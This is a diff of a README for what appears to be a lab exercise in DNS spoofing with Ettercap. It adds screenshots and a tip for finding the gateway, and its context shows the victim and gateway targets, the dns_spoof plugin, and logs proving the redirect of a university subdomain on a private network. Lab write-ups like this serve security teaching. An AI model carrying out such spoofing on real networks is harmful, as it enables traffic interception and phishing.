@@ -149,6 +149,8 @@ pmics.cse.du.ac.bd     A   192.168.219.134
 ```
 ```*.pmics.cse.du.ac.bd catches any subdomain like pmics.cse.du.ac.bd```
 
+<img width="644" alt="Screenshot 2025-05-28 at 12 56 44 PM" src="https://github.com/user-attachments/assets/b8fa5237-1e30-4def-8632-e3d1de61353f" />
+
 ## 🧪 Step 3: Launch Ettercap
 Run this in terminal:
 ```bash
@@ -164,9 +166,12 @@ Explanation:
 
 ```/192.168.219.135//```: Victim
 
-```/192.168.219.2//```: Gateway (replace with your actual gateway)
+```/192.168.219.2//```: Gateway (To find Gateway,type this in the terminal: ```ip route```)
 
 ```-P dns_spoof```: Load the DNS spoof plugin
+
+<img width="644" alt="Screenshot 2025-05-28 at 12 57 39 PM" src="https://github.com/user-attachments/assets/bf9163de-3cc5-4491-ab0a-06a31a7a1dd6" />
+
 
 ## 📸 4. Proof of Attack
 ✅ Successful Execution Steps:
@@ -187,6 +192,9 @@ Apache serves the fake site with a big, bold message:
 
 ```University of Dhaka```
 
+<img width="1439" alt="Screenshot 2025-05-28 at 1 03 20 PM" src="https://github.com/user-attachments/assets/80032043-58e0-40ca-b7ca-15c2ad3683bc" />
+
+
 Victim's terminal confirms DNS redirection:
 ```bash
 ping pmics.cse.du.ac.bd
@@ -195,9 +203,13 @@ PING pmics.cse.du.ac.bd (192.168.219.134) 56(84) bytes of data.
 64 bytes from 192.168.219.134: icmp_seq=2 ttl=64 time=0.330 ms
 64 bytes from 192.168.219.134: icmp_seq=3 ttl=64 time=0.324 ms
 ```
+<img width="640" alt="Screenshot 2025-05-28 at 1 04 08 PM" src="https://github.com/user-attachments/assets/5723384d-ba8d-457e-aa8a-aa3ea6a62a46" />
+
 Attacker's Ettercap terminal logs:
+
 ```bash
 dns_spoof: A [pmics.cse.du.ac.bd] spoofed to [192.168.219.134] TTL [3600 s]
 ```
 
+<img width="637" alt="Screenshot 2025-05-28 at 1 04 50 PM" src="https://github.com/user-attachments/assets/bf8f1dcd-557b-405c-a41b-cbc265ee129c" />
 
